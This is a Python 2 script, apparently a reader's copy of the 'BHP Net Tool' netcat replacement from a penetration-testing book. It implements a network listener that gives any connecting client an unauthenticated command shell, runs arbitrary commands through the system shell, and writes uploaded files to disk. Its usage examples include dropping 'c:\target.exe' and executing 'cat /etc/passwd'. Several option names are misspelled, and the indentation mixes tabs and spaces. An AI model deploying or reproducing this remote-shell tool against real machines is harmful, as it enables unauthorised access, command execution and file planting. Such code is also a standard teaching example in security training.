#!/usr/bin/python
# coding: utf-8

# very first one from python book

import sys, socket, getopt, threading, subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhnet.py -t target_host -p port"
    print "-l --listen			- listen on [host]:[port] for"
    print "			  	  incoming connections"
    print "-e --execute=file_to_run	- execute the given file upon"
    print "				  receiving a connection"
    print "-c --command			- initialize a command shell"
    print "-u --upload=destination	- upon receiving connection upload a"
    print "				  file and write to [destination]"
    print 
    print
    print "Examples: "
    print "bhnet.py -t 192.168.179.49 -p 5555 -l -c"
    print "bhnet.py -t 192.168.179.49 -p 5555 -l -u c:\\target.exe"
    print "bhnet.py -t 192.168.179.49 -p 5555 -l -e \"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.179.49 -p 135"
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
            
        while True:
            recv_len = 1
            response = ""
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:  
		    break
		
            print response
	    
	    buffer = raw_input("")
	    buffer += "\n"
	    client.send(buffer)
	    
    except:
	print "[+] Exception Existing!"
	client.close()
	
def server_loop():
    global target
    if not len(target):
	target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print("[+]Listening on %s:%d\n" % (target, port))
    while True:
	    client_socket, addr = server.accept()
	    print("[+]Accepting client from %s" % target)
	    client_thread = threading.Thread(target=client_handler,args=(client_socket,))
	    client_thread.start()
	    
def run_command(command):
    command = command.rstrip()
    try:
	output = subprocess.check_output(command, stderr=subprocess.STDOUT,shell=True)
    except:
	output = "Failed to Execute command.\n" 
    return output

def client_handler(client_socket):
    global upload_destination
    global upload
    global execute
    global command
    
    if len(upload_destination):
	file_buffer = ""
	print("Upload Setting...")
	while True:
	    data = client_socket.recv(1024)
	    if len(data) == 0:
		print file_buffer
		break
	    else:		
		file_buffer += data
	try:
	    print("opening data to \'%s\'" % upload_destination)
	    file_descriptor = open(upload_destination, "wb")
	    print("writing data to \'%s\'" % upload_destination)
	    file_descriptor.write(file_buffer)
	    print("done with writing on server")
	    file_descriptor.close()
	    client_socket.send("Successfully saved file to %s\n" % upload_destination)
	except:
	    client_socket.send("Failed to save file to %s\n" % upload_destination)
	    
    if len(execute):
	output = run_command(execute)
	client_socket.send(output)
	
    if command:
    	prompt = "<BHP:#>"
	client_socket.send(prompt)
	while True:
		cmd_buffer = ""
		while "\n" not in cmd_buffer:
		    cmd_buffer += client_socket.recv(1024)
		response = run_command(cmd_buffer)
		response += prompt
		
		client_socket.send(response)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help", "listen", "execute=", "target","port=", "command", "upload="])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--exeute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
        
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()    
	print("[+]Executing \'client_sender\' function(%s:%d)\n" % (target, port))
        client_sender(buffer)
    
    if listen:
	print "Server setting up..."
	if len(execute):
	    print execute
	else:
	    print("None")
        server_loop()
        
main()
